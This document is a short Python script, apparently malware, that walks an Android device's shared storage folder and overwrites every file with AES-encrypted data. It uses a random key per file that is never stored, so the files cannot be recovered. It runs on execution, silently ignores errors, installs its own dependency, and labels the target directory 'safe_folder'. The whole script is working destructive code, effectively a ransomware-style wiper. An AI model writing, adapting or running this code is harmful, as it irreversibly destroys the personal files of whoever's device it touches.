import os
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from concurrent.futures import ThreadPoolExecutor

safe_folder = "/storage/emulated/0/"

def install_requirements():
    try:
        import Crypto
    except ImportError:
        os.system(f"{sys.executable} -m pip install pycryptodome")

install_requirements()

def generate_file_key():
    return get_random_bytes(32)

def encrypt_file(file_path, key):
    cipher = AES.new(key, AES.MODE_CBC)
    
    with open(file_path, "rb") as f:
        file_data = f.read()
    
    encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))
    
    with open(file_path, "wb") as f:
        f.write(cipher.iv + encrypted_data)

def encrypt_single_file(file_path):
    try:
        file_key = generate_file_key()
        encrypt_file(file_path, file_key)
    except Exception:
        pass

def encrypt_files_in_folder(folder):
    files_to_encrypt = []
    
    for root, dirs, files in os.walk(folder):
        for file in files:
            file_path = os.path.join(root, file)
            files_to_encrypt.append(file_path)

    with ThreadPoolExecutor(max_workers=8) as executor:
        executor.map(encrypt_single_file, files_to_encrypt)

encrypt_files_in_folder(safe_folder)